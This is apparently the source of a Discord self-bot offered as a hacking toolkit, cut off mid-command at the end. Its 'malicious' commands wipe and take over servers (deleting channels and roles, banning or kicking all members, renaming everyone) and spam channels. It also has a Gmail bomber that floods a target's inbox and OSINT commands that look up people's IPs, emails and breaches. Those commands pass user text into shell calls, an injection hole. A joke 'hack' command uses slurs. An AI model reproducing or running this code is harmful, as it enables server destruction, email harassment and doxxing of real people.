import asyncio
import datetime
import io
from urllib.parse import urlencode
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, \
    string, ctypes
import json
import os
import functools
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from discord.ext import commands, tasks
import aiohttp
import colorama
import discord
import numpy
import requests
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
from discord import Guild
import webbrowser
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, asyncio, functools, logging
import discord, ctypes, json, os, webbrowser, requests, datetime, urllib, time, string, random, asyncio, aiohttp
from discord import Webhook, RequestsWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
import asyncio
from discord.ext import commands, tasks
import os
import sys
from discord import *
from discord.utils import get
import sqlite3
import json
import discord
import urllib
from colorama import Fore, Back, Style
from selenium import webdriver
from dhooks import Webhook, Embed
import time
from itertools import cycle
from dotenv import load_dotenv
from discord.ext.commands import has_permissions, MissingPermissions
from urllib.request import Request, urlopen
import socket
from subprocess import run
from discord.ext.commands import has_permissions,  CheckFailure, check
import os
import logging
import socket
import platform

hostname = socket.gethostname() 
my_system = platform.uname()  
IPAddr = socket.gethostbyname(hostname)  

load_dotenv()

intents = discord.Intents.all()
intents.presences = True
intents.members = True
#####################
######## CORE #######
#####################

cyan = "\033[1;36;40m"
green = "\033[1;32;40m"
red = "\033[1;31;40m"
Y = '\033[1;33;40m'

bot = discord.Client(intents=intents)
bot = commands.Bot("=", intents=intents, self_bot=True)

tts_language = "en"

bot.copycat = None
bot.remove_command('help')

api = "http://ip-api.com/json/" # API used


def json1(arg):
    response = requests.get(api + arg)
    json_data = json.loads(response.text)
    return(json_data)

#status = cycle(
#    [f"Monitoring {str(bot.guilds)} Servers"])

def __init__(self, bot):
    self.bot = bot
    self.states = {}

start_time = time.time()
loop = asyncio.get_event_loop()


def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer


def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass








##################################################
################ TERMINAL SETUP ##################
##################################################
def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.01)
    
@bot.event
async def on_ready():
        
            change_status.start()
            os.system("clear")
            count = len(bot.guilds)
            
            print(f"""
{Fore.RED}     █─▄▄▄▄█▄─█─▄█▄─▀█▄─▄█─▄─▄─█─█─█▄─▄▄─█─▄─▄─█▄─▄█─▄▄▄─███─▄▄▄▄█▄─▄▄─█▄─▄███▄─▄▄─█▄─▄─▀█─▄▄─█─▄─▄─█
     █▄▄▄▄─██▄─▄███─█▄▀─████─███─▄─██─▄█▀███─████─██─███▀███▄▄▄▄─██─▄█▀██─██▀██─▄████─▄─▀█─██─███─███
{Fore.WHITE}     ▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▀▄▄▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▄▄▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▄▀▀""")
            time.sleep(2)
            print_slow(f""" 
               {Fore.BLUE}DISCORD {Fore.YELLOW}: {Fore.WHITE}https://discord.gg/cgfq5F9YYE {Fore.CYAN}  ------------------------------
               {Fore.MAGENTA}INSTAGRAM {Fore.YELLOW}: {Fore.WHITE}@idice.security               {Fore.CYAN}| {Fore.RED}CREATED-BY {Fore.YELLOW}: {Fore.WHITE}RetroPackets  {Fore.CYAN}|
               {Fore.CYAN}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   {Fore.CYAN}| {Fore.RED}COMPANY    {Fore.YELLOW}: {Fore.WHITE}iDiceSecurity {Fore.CYAN}|
               {Fore.RED}Connection {Fore.YELLOW}: {Fore.WHITE}{IPAddr}                    {Fore.CYAN}| {Fore.RED}PREFIX     {Fore.YELLOW}: {Fore.RED}[ {Fore.WHITE}= {Fore.RED}]         {Fore.CYAN}|
          {Fore.RED}System Software {Fore.YELLOW}: {Fore.WHITE}{my_system.system}                        {Fore.CYAN}| {Fore.RED}CODE       {Fore.YELLOW}: {Fore.WHITE}Python3.9.2   {Fore.CYAN}|
                {Fore.RED}Node Name {Fore.YELLOW}: {Fore.WHITE}{my_system.node}                   {Fore.CYAN}------------------------------
                  {Fore.RED}Release {Fore.YELLOW}: {Fore.WHITE}{my_system.release}               {Fore.RED}Server Count {Fore.WHITE}{count}
                  {Fore.RED}Version {Fore.YELLOW}: {Fore.WHITE}{my_system.version}
                  {Fore.RED}Machine {Fore.YELLOW}: {Fore.WHITE}{my_system.machine}

""")

    

@tasks.loop(seconds=10)
async def change_status():
    count = len(bot.guilds)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{count} Servers"))
    #await bot.change_presence(activity=discord.Game(next(status)))
    

###################################################
##################### EVENTS ######################
###################################################

    



##################################################
############## MALICIOUS SECTION 1 ###############
##################################################


bot.command()
async def crash(ctx):
    await ctx.send("https://tenor.com/view/discord-crash-gif-21388226")
    await ctx.send("https://tenor.com/view/iphone-crash-discord-gif-19784533")
    await ctx.send("https://imgur.com/ehxMcVy?nocache=true")



@bot.command(aliases=['crashgif', 'SCRASH', 'scrash'])
async def spamcrash(ctx):
    await ctx.send("https://gfycat.com/achingclearcaecilian")
    await ctx.send("https://gfycat.com/ampleblissfulfiddlercrab")
    await ctx.send("https://gfycat.com/achingclearcaecilian")
    await ctx.send("https://gfycat.com/anguisheddefinitivegoldenretriever")
    await ctx.send("https://gfycat.com/achingclearcaecilian")
    await ctx.send("https://gfycat.com/anxioussharpfox")
    await ctx.send("https://imgur.com/ehxMcVy?nocache=true")
    await ctx.send(
        "https://www.digitalspy.com/tech/smartphones/a814918/bizarre-5-second-video-will-completely-crash-any-iphone/")
    await ctx.send("https://tenor.com/view/discord-crash-gif-21388226")
    await ctx.send("https://tenor.com/view/iphone-crash-discord-gif-19784533")
    await ctx.send("https://i.imgur.com/ehxMcVy.gif")
    await ctx.send("https://tenor.com/view/discordcrash-gif-21499127")
    await ctx.send("https://tenor.com/view/crasher-gif-21441724")


@bot.command(aliases=["Qnuke", "cower", "qnuke"])
async def quicknuke(ctx):
  await ctx.guild.edit(name='Crashed by Synthetic Selfbot')
  for channel in ctx.guild.channels:
    await channel.delete()
  ban = 0
  for member in ctx.guild.member:
    try:
      ban += 1
      await member.ban()
    except:
      continue
  roles = ctx.guild.roles
  roles.pop(0)
  for role in roles:
    if ctx.guild.me.roles[-1] > role:
      await role.delete()
    else:
      break
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
    except:
      pass
      await ctx.guild.create_text_channel(name = "iDiceSecurity Was Here")


@bot.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)



@bot.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@bot.command()
async def nickall(ctx, *, name="iDiceSecurity Runs My Life"):
  print(cyan +"Nickname Changer Request...")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 



@bot.command()
async def masskick(ctx): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
            print("\n\033[94mMASSKICK SUCCESS!!! \033[91m \n")

        except:
            print("\nMASSKICK FAILED!!! \033[91m \n")


            pass 



@bot.command()
async def copy(ctx): # b'\xfc'
    await ctx.message.delete()
    await bot.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in bot.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

##################################################
################ ADMIN COMMANDS ##################
##################################################

@bot.command(aliases=['banlist', 'GETBANS'])
async def getbans(ctx):
    await ctx.message.delete()
    await ctx.send("""```
 >BAN LIST< 
```""")
    if ctx.message.author.guild_permissions.ban_members:
        x = await ctx.message.guild.bans()
        x = "\n".join([str(y.user) for y in x])
        return await ctx.send(x)

    

@bot.command(aliases=['SERVERS', 'AdminServers', 'servers'])
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in bot.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)

    

@bot.command(aliases=['UPTIME'], pass_context=True)
async def uptime(ctx):
    current_time = time.time()
    difference = int(round(current_time - start_time))
    text = str(datetime.timedelta(seconds=difference))

    await ctx.send("```Current Uptime: ```" + text)


@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.message.delete()

    await ctx.send('❖ ︎ ᴛʜᴇ ᴜꜱᴇʀ ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ꜱᴇʀᴠᴇʀ ❖︎')


@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    try:
        await member.ban(reason=reason)
        await ctx.send("**`" + str(member) + "` Was Banned From `" + str(
            ctx.guild.name) + "` by `" + ctx.author.mention + "` with reason: `" + str(reason) + "` succesfully!**")
    except:
        await ctx.send("**Failed To Ban User `" + str(member) + "` from `" + str(
            ctx.guild.name) + "` " + ctx.author.mention + "`**")
        await ctx.message.delete()



@bot.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == bot.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass
            
            await ctx.send('¤☆✭ᴘᴜʀɢᴇ ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ✭☆¤')


@bot.command()
async def unlock(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)

@bot.command(aliases=["WARN"])
@commands.has_permissions(view_audit_log=True)
async def warn(ctx, member: discord.Member, *, reason=None):
    await ctx.send(f"``` {ctx.author} warned {member} for the following reason: ```" + reason)
    await ctx.message.delete()



@commands.has_permissions(administrator=True)
def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)


@bot.command(pass_context=True)
@commands.is_owner()
async def restart(ctx):
    os.system("clear")
    await ctx.message.delete()
    message = await ctx.send("""```Restart Requested...
Attempting To Restart [Synthetic Selfbot]...```""")
    restart_program()

##################################################
############### GENERAL COMMANDS #################
##################################################

@bot.command(aliases=['markasread', 'ack', 'READ'])
async def read(ctx):
    await ctx.message.delete()
    for guild in bot.guilds:
        await guild.ack()

@bot.command()
async def invite(ctx):
    await ctx.message.delete()
    await ctx.send("https://discord.gg/cgfq5F9YYE")


@bot.command(aliases=['PING', 'PINGWEB'])
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down ({r})', delete_after=60)
        else:
            await ctx.send(f'Website is operational ({r})', delete_after=60)


@bot.command()
async def tinyurl(ctx, *, link):
    await ctx.message.delete()
    r = requests.get(f"http://tinyurl.com/api-create.php?url={link}").text
    await ctx.send(f"{r}")




@bot.command()
async def block(ctx, *, user: discord.User):
    await ctx.send("""```Attempting to block user...""")
    await user.block()


@bot.command(aliases=['guildpfp', 'serverpfp', 'servericon', 'Guildicon'])
async def guildicon(ctx):
    await ctx.message.delete()
    await ctx.send(f"{ctx.guild.icon_url}")




@bot.command(aliases=['Gethost'])
async def gethost(ctx, *, ip: str):
    await ctx.message.delete()
    host = socket.gethostbyaddr(ip)
    await ctx.send(f"""***Time Sent :*** ```{ctx.message.created_at}```
***Target :*** ```{ip}```
***Host Found :*** ```{host}```""")



@bot.command(aliases=['IP', 'IPlookup', 'IPLOOKUP', 'IPLookup', 'iplookup'])
async def ip(ctx, arg):
    await ctx.message.delete()
    json2 = json1(arg)
    query = json2['query']
    isp = json2['isp']
    country = json2['country']
    city = json2['city']
    org = json2['org']
    asn = json2['as']
    tm = json2['timezone']
    zipy = json2['zip']
    rg = json2['regionName']
    lon = json2['lon']
    lat = json2['lat']
    await ctx.send(f"""
***IP:*** ```{query}```
***ORG:*** ```{asn}```
***TIME:*** ```{tm}```
***COUNTRY:*** ```{country}```
***REGION:*** ```{rg}```
***CITY:*** ```{city}```
***LON:*** ```{lon}```
***LAT:*** ```{lat}```
***ISP:*** ```{isp}```
***ZIP:*** ```{zipy}```""")



@bot.command(aliases=["whois", 'Whois', 'Userinfo', 'sinfo', 'sinf', 'userinfo'], )
async def selfinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        member = ctx.message.author

    roles = [role for role in member.roles]
    await ctx.send(f"""```User Info - {member}```
***Status -*** ```{member.status}```
***User ID -*** ```{member.id}```
***Username -*** ```{member.display_name}```
***Account Created -*** """ + member.created_at.strftime("```%a, %#d %B %Y, %I:%M %p``` ***UTC***"))
    await ctx.send(f"""***Joined Server -*** """ + member.joined_at.strftime("```%a, %#d %B %Y, %I:%M %p``` ***UTC***"))
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in member.guild_permissions if p[1]])
    await ctx.send(f"""***Guild Permissions -*** ```{perm_string}```""")



@bot.command(aliases=['Stats', 'serverstats', 'guildinfo'])
async def stats(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await ctx.send(f"""```SERVER INFO - {ctx.message.created_at}```
📛 ***| NAME -*** ```{guild.name}```
🆔 ***| GUILD ID -*** ```{guild.id}```
👑 ***| OWNER -*** ```{guild.owner_id}```
👥 ***| MEMBERS -*** ```{guild.member_count}```
🕍 ***| CREATED -*** """ + guild.created_at.strftime("```%m/%d/%Y, %H:%M:%S %p```")) 




##################################################
############### SPECIAL COMMANDS #################
##################################################
    
@bot.command(aliases=['spider', 'SPIDERFOOT', 'SPIDER'])
async def spiderfoot(ctx):
    await ctx.message.delete()
    await ctx.send("""```
SpiderFoot Has Started...
-------------------------
[WARNING] RUNNING SPIDERFOOT WILL PROVENT COMMANDS FROM ACTIVATING...
[RESTART-TO-FIX]```""")
    webbrowser.open('http://127.0.0.1:5001')
    os.system("spiderfoot -l 127.0.0.1:5001")


@bot.command(aliases=['cmds', 'CMD'], pass_context=True)
async def commands(ctx):
    await ctx.message.delete()
    await ctx.send("""
***ADMIN COMMANDS***
```adminservers
getbans
uptime
purge
warn
kick
ban```

***SPECIAL COMMANDS***
```spiderfoot
usersearch
commands
gbomb```

***GENERAL COMMANDS***
```guildicon
selfinfo
pingweb
restart
tinyurl
gethost
invite
stats
read
copy
ip```

***FUN COMMANDS***
```token
nitro
hack
say7
tts```

***HACK COMMANDS***
```Usersearch
Webmail
Emusd
Nmap
Pwnd
Deep```

***MALICIOUS COMMANDS***
```renamechannels
broadcast
quicknuke
masskick
nickall
crash
spam```
    """)





@bot.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber', 'ebomb', 'gbomb'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    GmailBomber()

###################################################
################## FUN COMMANDS ###################
###################################################

@bot.command()
async def hack(ctx, user: discord.User = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully Hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")


@bot.command()
async def token(ctx, user: discord.User = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@bot.command()
async def say7(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
        .replace('E', '3').replace('i', '!').replace('I', '!') \
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'{text}')



def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


@bot.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())


@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

@bot.command(aliases=["TTS"])
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))



@bot.command(aliases=['av', 'Av', 'Avatar', 'AV'])
async def avatar(ctx, *,  avamember : discord.Member=None):
    await ctx.message.delete()
    userAvatarUrl = avamember.avatar_url
    await ctx.send(userAvatarUrl)

@bot.command(aliases=['cast', 'bcast', 'Broadcast'], pass_context=True)
async def broadcast(ctx, *, msg):
    for server in bot.guilds:
        for channel in server.text_channels:
            try:
                await channel.send(msg, delete_after=60)
                await ctx.message.delete()
            except Exception:
                continue
            else:
                break


###################################################
################### HELP MENU #####################
###################################################

@bot.command(aliases=['HELP', 'Help'])
async def help(ctx):
    await ctx.message.delete()
    webbrowser.open('file://' + os.path.realpath("src/help.html"))
    await ctx.send ("""```
HELP MENU REQUEST ACTIVATED...
STARTED [help.html] FILE FOR HELP MENU...
```""")
    
########
#HACK COMMANDS


@bot.command(aliases=['Webmails', 'webmail', 'Webmail'])
async def webmails(ctx, *, text):
    await ctx.message.delete()
    await ctx.send("```Email Scrape initializing...```", delete_after=10)
    #await ctx.send(f"{text}")
    os.system("cd src/tools/Infoga && python3 infoga.py --domain " + text + " --source all --breach -v 1 --report result.txt")
    time.sleep(2)
    
    a_file = open("src/tools/Infoga/result.txt")
    file_contents = a_file.read()
    await ctx.send(f"```{file_contents}```")

@bot.command(aliases=['Pwnd'])
async def pwnd(ctx, *, text):
    await ctx.message.delete()
    await ctx.send("```Email Osint initializing...```", delete_after=10)
    #await ctx.send(f"{text}")
    os.system("cd src/tools/Infoga && python3 infoga.py --info " + text + " -v 3 --report result.txt")
    time.sleep(2)
    
    a_file = open("src/tools/Infoga/result.txt")
    file_contents = a_file.read()
    await ctx.send(f"```{file_contents}```")


@bot.command(aliases=['Nmap'])
async def nmap(ctx, *, text):
    await ctx.message.delete()
    await ctx.send("```Nmap initializing...```", delete_after=10)
    #await ctx.send(f"{text}")
    os.system("nmap " + text + "> result.txt")
    time.sleep(2)
    
    a_file = open("result.txt")
    file_contents = a_file.read()
    await ctx.send(f"```{file_contents}```")

@bot.command(aliases=['Emused', 'emusd', 'emailused'])
async def emused(ctx, *, text):
    await ctx.message.delete()
    await ctx.send("```Email Search initializing...```", delete_after=10)
    #await ctx.send(f"{text}")
    os.system("holehe --only-used " + text + "> result.txt")
    time.sleep(2)
    
    a_file = open("result.txt")
    file_contents = a_file.read()
    await ctx.send(f"```{file_contents}```")

@bot.command(aliases=['Githunt', 'gbhunt'])
async def githunt(ctx, *, text):
    await ctx.message.delete()
    await ctx.send("```Github Scrape initializing...```", delete_after=10)
    #await ctx.send(f"{text}")
    os.system("cd src/tools/gitrecon && python3 gitrecon.py -s github " + text + " > result.txt")
    time.sleep(2)
    
    a_file = open("src/tools/gitrecon/result.txt")
    file_contents = a_file.read()
    await ctx.send(f"```{file_contents}```")

@bot.command(aliases=['advip', 'advancedip', 'ip', 'Advip'])
async def AdvIP(ctx, *, text):
    await ctx.message.delete()
    await ctx.send("```Advanced IP Lookup initializing...```", delete_after=10)
    #await ctx.send(f"{text}")
    os.system("cd src/tools/geo-recon && python3 geo-recon.py " + text + " > result.txt")
    time.sleep(2)
    
    a_file = open("src/tools/geo-recon/result.txt")
    file_contents = a_file.read()
    await ctx.send(f"```{file_contents}```")
    


#########
# SENDS FILE INSTEAD FOR HACK COMMANDS

@bot.command(aliases=['Usersearch'])
async def usersearch(ctx, *, text):
        await ctx.message.delete()
        await ctx.send("""```
Username Search initializing...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
